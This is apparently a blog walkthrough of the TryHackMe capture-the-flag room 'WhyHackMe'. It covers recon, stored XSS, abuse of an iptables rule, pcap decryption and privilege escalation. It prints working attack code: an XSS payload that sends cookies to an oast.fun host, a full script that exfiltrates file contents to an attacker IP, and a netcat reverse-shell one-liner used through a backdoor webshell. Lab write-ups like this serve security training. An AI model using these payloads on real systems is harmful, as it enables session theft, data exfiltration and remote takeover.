---
author: "Shebu"
title: "WhyHackMe: THM"
date: "2024-01-14"
tags: ["XSS to exfiltrate data", "iptables"]
cover:
    image: img/whyhackme.png
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

**WhyHackMe** is a **medium difficulty** machine from **TryHackMe** which involves exfiltrating a sensitive file from the server using stored XSS to gain foothold. Later using iptables we modify a rule to allow incoming traffic via a certain port in which the attacker had uploaded a web shell to run system commands. Then by decrypting a .pcap file, we find the endpoint containing the backdoor & with the help of that we gain a shell as _www-data_ user where the user has sudo permissions.

*[Image: header]*

|  **Room** 	| WhyHackMe                                          	|
|:--------------:	|----------------------------------------------------	|
|     **OS**     	| Linux                                              	|
| **Difficulty** 	| Medium                                             	|
|  **Room Link** 	| [https://tryhackme.com/room/whyhackme](https://tryhackme.com/room/whyhackme)               	|
|   **Creator**  	| [suds4131](https://tryhackme.com/p/suds4131) 	|

# Recon 
----------------------

## Portscan 

Rustscan finds 3 open TCP ports: Anonymous FTP(21), SSH(22), Apache http server(80).

```bash
sh3bu@Ubuntu:~/thm/whyhackme$ rustscan --range 0-65535 -u 6500 -b 3000 $ip -- -sCV -oN recon/scans/rustscan.out
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/sh3bu/.rustscan.toml"
[~] Automatically increasing ulimit value to 6500.
Open 10.10.50.87:22
Open 10.10.50.87:21
Open 10.10.50.87:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -sCV -oN recon/scans/rustscan.txt -vvv -p 22,21,80 10.10.50.87
Nmap scan report for 10.10.172.102
Host is up, received echo-reply ttl 60 (0.14s latency).
Scanned at 2024-01-12 16:44:19 IST for 12s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 60 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.17.105.88
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVPKwhXf+lo95g0TZQuu+g53eAlA0tuGcD2eIcVNBuxuq46t6mjnkJsCgUX80RB2wWF92OOuHjETDTduiL9QaD2E/hPyQ6SwGsL/p+JQtAXGAHIN+pea9LmT3DO+/L3RTqB1VxHP/opKn4ZsS1SfAHMjfmNdNYALnhx2rgFOGlTwgZHvgtUbSUFnUObYzUgSOIOPICnLoQ9MRcjoJEXa+4Fm7HDjo083hzw5gI+VwJK/P25zNvD1udtx3YII+cnOoYH+lT2h/gPcJKarMxDCEtV+3ObVmE+6oaCPx+eosZ+45YuUoAjNjE/U/KAWIE+Y0Xav87hQ/3ln4bzB8N5WV41/WC5zqIfFzuY+ewx6Q6u6t7ijxZ+AE2sayFIqIgmXKWKq3NM9fgLgUooRpBRANDmlb9xI1hzKobeMPOtDkaZ+rIUxOLtUMIkzmdRAIElz3zlxBD+HAqseFrmXKKvLtL6JllEqtEZShSENNZ5Rbh3nBY4gdiPliolwJkrOVNdhE=
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFynIMOUWPOdqgGO/AVP9xcS/88z57e0DzGjPCTc6OReLmXrB/egND7VnoNYnNlLYtGUILQ1qoTrL7hC+g38pxc=
|   256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKTv0OsWH1pAq3F/Gpj1LZuPXHZZevzt2sgeMLwWUCRt
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 12 16:44:31 2024 -- 1 IP address (1 host up) scanned in 25.67 seconds
```

## Directory Bruteforce 

Feroxbuster reveals the following endpoints. 
```bash
sh3bu@Ubuntu:~/thm/whyhackme$ feroxbuster -w ~/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://$ip/ -x php,json,bak,pl,sh,html,asp,aspx,cgi,rb -C 404 -o  recon/scans/feroxbuster.out

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.50.87/
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/sh3bu/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 🔎  Extract Links         │ true
 💾  Output File           │ recon/scans/feroxbuster.out
 💲  Extensions            │ [php, json, bak, pl, sh, html, asp, aspx, cgi, rb]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       61l       99w      800c http://10.10.50.87/assets/style.css
200      GET       20l       38w      523c http://10.10.50.87/login.php
200      GET       22l       56w      643c http://10.10.50.87/register.php
200      GET        0l        0w        0c http://10.10.50.87/config.php
302      GET        0l        0w        0c http://10.10.50.87/logout.php => login.php
301      GET        9l       28w      311c http://10.10.50.87/assets => http://10.10.50.87/assets/
200      GET       33l       74w      606c http://10.10.50.87/assets/login.css
200      GET       22l      437w     3102c http://10.10.50.87/blog.php
200      GET       29l       66w      563c http://10.10.50.87/
200      GET       29l       66w      563c http://10.10.50.87/index.php
```
## FTP

I'll login to the FTP server since it has anonymous login enabled. There we find a file called `update.txt`.
```bash
sh3bu@Ubuntu:~/thm/whyhackme$ ftp $ip
Connected to 10.10.50.87.
220 (vsFTPd 3.0.3)
Name (10.10.50.87:sh3bu): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||35331|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> get update.txt
local: update.txt remote: update.txt
229 Entering Extended Passive Mode (|||46431|)
150 Opening BINARY mode data connection for update.txt (318 bytes).
100% |**************************************************************************************************************************************************|   318        1.66 MiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (1.96 KiB/s)
```

`update.txt` has the following message from admin.
> Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is
> only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account.
> -> admin

This made me wonder if there would be a possible SSRF on the website at port 80.

## Website: TCP 80

It is a blog site.

*[Image: header]*

Scrolling down the page we find a comment section. We need to log in to comment on the site. There is also a comment from admin stating that he would be going through all the comments made by the user. So this means there is somewhere a stored XSS vulnerability that can be exploited.

*[Image: header]*

So I tried to login to the site using the usernames that we encountered: **admin**, **mike** along some common weak passwords. It didn't work.
Even tried sql injection , that too yielded nothing.

Remember there was a `register.php` page found during directory bruteforcing? Using that I registered as a user & logged in.

*[Image: header]*

# Shell as Jack 

Initially I tried injecting several XSS payloads into the comment field but failed to execute my malicious js code.

*[Image: header]*

While it is sure that a stored XSS vulnerability exists, the challenge lies in determining which specific user input is susceptible to exploitation! 

There are only 2 places where the application accepts user i/p.
- Comments
- User registration

Now I tried to register as another user with the username: `<script>alert()</script>` & then logged in. 

*[Image: header]*

After posting a comment , I got what I expected. An alert box popped up!

*[Image: header]*

## Stealing admin's cookies

So I went again and re-registered with a user but this time with the following payload to steal admin's cookie.
```js
<script> fetch('http://ckfdjunpvhqdbictkgyyupea6j4xms37x.oast.fun', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```

So now when the admin views our comment, the username field is vulnerable to XSS, it will execute my malicious code to steal admin's cookies & send it to my [interact.sh](https://app.interactsh.com/#/) server which is an open-source alternative to Burp-Collaborator.

*[Image: header]*

I have now successfully stolen the admin's session cookie -`x73smx4j6aepuyygktcibdqhvpnujdfkc`

I tried to replace my sesion cookie with that of with admin's. But nothing worked. I was stuck here & then later I remembered about the note that admin had left. The **127.0.0.1/dir/pass.txt** file has credentials of new account.

## Exfiltrate data using XSS

Googling for ways to access files via XSS, I came across a blog by **Trustedsec** which explained how we could use stored XSS to exfiltrate data using XSS.

> Link to blog: [https://trustedsec.com/blog/simple-data-exfiltration-through-xss](https://trustedsec.com/blog/simple-data-exfiltration-through-xss) 

The following is the `exfilPayload.js` script mentioned in the blog to exfiltrate data from the server.
```js
// TrustedSec Proof-of-Concept to steal 
// sensitive data through XSS payload

function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}

function stealData()
{
	var uri = "/dir/pass.txt";

	xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			// We have the response back with the data
			var dataResponse = read_body(xhr);

			// Time to exfiltrate the HTML response with the data
			var exfilChunkSize = 2000;
			var exfilData      = btoa(dataResponse);
			var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
			var remainderBits  = exfilData.length % exfilChunkSize;

			// Exfil the yummies
			for (i = 0; i < numFullChunks; i++)
			{
				console.log("Loop is: " + i);

				var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));

				// Let's use an external image load to get our data out
				// The file name we request will be the data we're exfiltrating
				var downloadImage = new Image();
				downloadImage.onload = function()
				{
					image.src = this.src;
				};

				// Try to async load the image, whose name is the string of data
				downloadImage.src = "http://<attacker-ip>/exfil/" + i + "/" + exfilChunk + ".jpg";
			}

			// Now grab that last bit
			var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);
			var downloadImage = new Image();
			downloadImage.onload = function()
			{
    			image.src = this.src;   
			};

			downloadImage.src = "http://<attacker-ip>/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
			console.log("Done exfiling chunks..");
		}
	}
}

stealData();
```
> Note: Make sure to replace **<attacker-ip>** with your  **<tun0-ip>**.

So inorder for the exploit to work , we need to create a user with the following xss payload as username. 
```js
<script src="http://<attacker-ip>/exfilPayload.js"></script>
```

We then need to serve the `exfilPayload.js` file using **python http server** from our machine. 

So the scenario is like -

- Admin views our comment & the malicious script gets executed.
- As a result the script makes the server retreive the **exfilPayload.js** file from our python hosted server & executes it.
- Once our malicous script gets excecuted I will receive the contents of `127.0.0.1/dir/pass.txt` in base64 format to our http server.

Upon performing the above steps, I got the contents of the `/dir/pass.txt`.

```bash
sh3bu@Ubuntu:~/thm/whyhackme$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.17.105.88 - - [13/Jan/2024 14:26:37] "GET /exfilPayload.js HTTP/1.1" 200 -
10.17.105.88 - - [13/Jan/2024 14:26:37] "GET /exfilPayload.js HTTP/1.1" 200 -
10.17.105.88 - - [13/Jan/2024 14:26:38] code 404, message File not found
10.17.105.88 - - [13/Jan/2024 14:26:38] "GET /exfil/LAST/PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT40MDMgRm9yYmlkZGVuPC90aXRsZT4KPC9oZWFkPjxib2R5Pgo8aDE+Rm9yYmlkZGVuPC9oMT4KPHA+WW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byBhY2Nlc3MgdGhpcyByZXNvdXJjZS48L3A+Cjxocj4KPGFkZHJlc3M+QXBhY2hlLzIuNC40MSAoVWJ1bnR1KSBTZXJ2ZXIgYXQgMTAuMTAuMTM5LjIzMyBQb3J0IDgwPC9hZGRyZXNzPgo8L2JvZHk+PC9odG1sPgo=.jpg HTTP/1.1" 404 -
10.10.139.233 - - [13/Jan/2024 14:27:18] "GET /exfilPayload.js HTTP/1.1" 200 -
10.10.139.233 - - [13/Jan/2024 14:27:19] code 404, message File not found
10.10.139.233 - - [13/Jan/2024 14:27:19] "GET /exfil/LAST/amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=.jpg HTTP/1.1" 404 -
```

Notice the second data we've received. Decoding it by base64 I got the creds for the user `**jack**`
```bash
sh3bu@Ubuntu:~/thm/whyhackme$ echo "amFjazpXa********uZ0lESwo=" | base64 -d 
jack:Why********IDK
```

With the creds obtained I was able to ssh in as **Jack** & grab the `user.txt` flag 🚩.
```
sh3bu@Ubuntu:~/thm/whyhackme$ ssh jack@10.10.87.106
jack@10.10.87.106's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-144-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

97 updates can be applied immediately.
36 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

*** System restart required ***
Last login: Fri Jan 12 14:03:25 2024 from 10.17.105.88
jack@ubuntu:~$ ls
user.txt
jack@ubuntu:~$ cat user.txt
1c*********************a
```

# Shell as www-data 
 

Running `sudo -l` reveals that the user jack has sudo permissions to run **iptables** utility.

```bash
jack@ubuntu:~$ sudo -l
[sudo] password for jack: 
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

I checked the configured rules for iptables.
```
jack@ubuntu:~$ sudo /usr/sbin/iptables -L
[sudo] password for jack: 
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere
````
The output suggests that there is an active service running on port 41312. Since the incoming packets to that port is dropped, our Nmap scan didn't pick it up.

Upon accessing it from our attacker machine, it says **Bad request** as response. This is because the iptables rule is configured to drop incoming packets.

So using iptables, we can change the rule to accept all incoming connections to port 41312 using the following command.
```bash
sudo iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
```
Now if I performed an Nmap scan on that port, we find that it is also running an **Apache http server**.
```
sh3bu@Ubuntu:~/thm/whyhackme$ nmap 10.10.139.233 -p 41312 -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-13 15:21 IST
Nmap scan report for 10.10.139.233
Host is up (0.22s latency).

PORT      STATE SERVICE VERSION
41312/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 400 Bad Request
Service Info: Host: www.example.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.25 seconds
```

Now when we try to access it from attacking machine, we get a **403 Forbidden** message.

*[Image: header]*

Enumerating further, in the **/opt** directory there are 2 interesting files. I transferred it to my machine to analyse them.
```
jack@ubuntu:/$ ls /opt
capture.pcap  urgent.txt
```
## urgent.txt

The **urgent.txt** had the following message by admin.
> Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and
> help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting
> these files first.

When I checked the `/usr/lib/cgi-bin` directory, I saw that it was owned by user `h4cked` and thus the user `jack` can't cd into the directory & view the files inside.
```bash
jack@ubuntu:/var/www/html$ ls  -al /usr/lib/ | grep "cgi-bin"
drwxr-x---  2 root h4ck3d   4096 Aug 16 14:29 cgi-bin
```
## capture.pcap

Next up I opened **capture.pcap** using wireshark. But the contents were encrypted.

*[Image: header]*

In order to view the decrypted packets, we need to find the private key file in the victim machine. So using _find_ command, I was able to find the location where the priv-key is stored.

```bash
jack@ubuntu:~$ find / -type f -name "*.key" 2>/dev/null
/etc/apache2/certs/apache.key
```
I transferred it to my machine and decrypted the traffic by navigating to **Edit -> Prefernces -> TLS** . Click on **Edit** option in **RSA Keys List** & enter the IP, port, protocol & location of the private key.

*[Image: header]*

Now when we click OK, we should have the packets decrypted.

Now we set the wireshark filter to **http** to view only the HTTP packets.

*[Image: header]*

From the packets, it is clear that the attacker has uploaded a webshell as backdoor `/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id` to gain access to the system.

From the attacker machine, I could access the RCE backdoor webshell by providing the full path.

*[Image: header]*

> Note: Even though we get a 403 Forbidden page, there are high chances some directories/files can still be accessed by directly visiting the endpoint containing the file/directory. The files/directories can be found by brute forcing! 
> In our case, we got to know about the backdoor web shell via Wireshark packet capture.

Now in the `&cmd=` parameter I used the following reverse shell payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.105.88 8888 >/tmp/f` to get a shell as www-data(which also had **gid of h4cked**).

```bash
sh3bu@Ubuntu:~/thm/whyhackme$ pwncat-cs -lp 8888
[16:19:52] Welcome to pwncat 🐈!                                                                                                                                                __main__.py:164
[16:23:14] received connection from 10.10.75.176:41940                                                                                                                               bind.py:84
[16:23:18] 0.0.0.0:8888: upgrading from /usr/bin/dash to /usr/bin/bash                                                                                                           manager.py:957
[16:23:19] 10.10.75.176:41940: registered new host w/ db                                                                                                                         manager.py:957                         
(local) pwncat$                                                                             
(remote) www-data@ubuntu:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
```

# Shell as root 

The `www-data` user had the privilege to run any command as any user!
```bash
(remote) www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

So we can now easily grab the **root.txt** 🚩.
```
(remote) www-data@ubuntu:/usr/lib/cgi-bin$ sudo wc -c /root/root.txt
33 /root/root.txt
```

